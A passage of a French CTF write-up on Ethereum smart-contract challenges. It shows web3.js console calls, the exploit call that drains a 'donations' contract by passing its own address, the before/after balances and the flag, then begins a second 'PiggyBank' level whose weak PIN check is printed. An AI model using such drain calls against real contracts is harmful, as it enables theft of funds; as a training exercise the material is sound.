&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;constant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ABI&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x57A10FC74a52afDE6674C3DE0761ed021d4534f7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse d'instance&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pour accéder à des champs publiques, on faut simplement appeler &lt;code class=&quot;highlighter-rouge&quot;&gt;contract.champ()&lt;/code&gt;. Ci-dessus, on accède au champ &lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt;, on peut voir que sa valeur est de &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;PS1: Il faudra toujours ajouter en dernier paramètre, une fonction de callback : &lt;code class=&quot;highlighter-rouge&quot;&gt;(err,res)=&amp;gt;{console.log(err,res);}&lt;/code&gt;.&lt;/p&gt;

  &lt;p&gt;PS2: La réponse est un object, il faut déplier ce dernier et regardé le contenu du tableau &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// faire une transaction avec 0.0002 ether&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendTransaction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;me&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toWei&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0002&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);})&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;from&lt;/code&gt;: source (adresse de notre wallet)&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;to&lt;/code&gt;: destination (adresse du smart contract)&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;value&lt;/code&gt;: quantité d’ether, va correspondre à &lt;code class=&quot;highlighter-rouge&quot;&gt;msg.value&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;On peut voir que le solde est passé de &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;à &lt;code class=&quot;highlighter-rouge&quot;&gt;102&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;attack&quot;&gt;Attack&lt;/h2&gt;

&lt;p&gt;Il est facile de comprendre que la fonction importante dans ce smart contract est &lt;code class=&quot;highlighter-rouge&quot;&gt;getDonationsFromOwner()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getDonationsFromOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;C’est cette dernière qui réalise le transfert de tous les fonds à l’expéditeur d’une transaction (&lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender&lt;/code&gt;). Pour faire cela, il faut que la condition du &lt;code class=&quot;highlighter-rouge&quot;&gt;require()&lt;/code&gt; soit vraie.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Il faut que le paramètre &lt;code class=&quot;highlighter-rouge&quot;&gt;_contractOwner&lt;/code&gt;, soit égale à &lt;code class=&quot;highlighter-rouge&quot;&gt;address(this)&lt;/code&gt;. Le &lt;code class=&quot;highlighter-rouge&quot;&gt;this&lt;/code&gt;correspond au smart contract lui-même. Le &lt;code class=&quot;highlighter-rouge&quot;&gt;address(this)&lt;/code&gt; correspond alors à l’adresse du smart contract. Nous connaissons déjà cette adresse puisqu’elle est donnée dans le challenge.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Autre moyen de la retrouver:&lt;/p&gt;

  &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x57A10FC74a52afDE6674C3DE0761ed021d4534f7&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// avant&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// payload&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getDonationsFromOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0x57A10FC74a52afDE6674C3DE0761ed021d4534f7&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// après&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Il faut patienter quelques secondes avant que la transaction soit validée (attendre la notification de MetaMask).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Le smart contract a été dépouillé. On peut alors récupérer notre flag en appuyant sur Check.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SANTA{!!S0Lidi7y_BaSiCs!!}&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;level-2---piggybank&quot;&gt;Level 2 - PiggyBank&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 200&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PiggyBank&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;bytes32&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pinHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unlockPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pinHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;    
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;analyse-1&quot;&gt;Analyse&lt;/h2&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PiggyBank&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On travail maintenant sur le smart contract &lt;code class=&quot;highlighter-rouge&quot;&gt;PiggyBank&lt;/code&gt;.&lt;/p&gt;

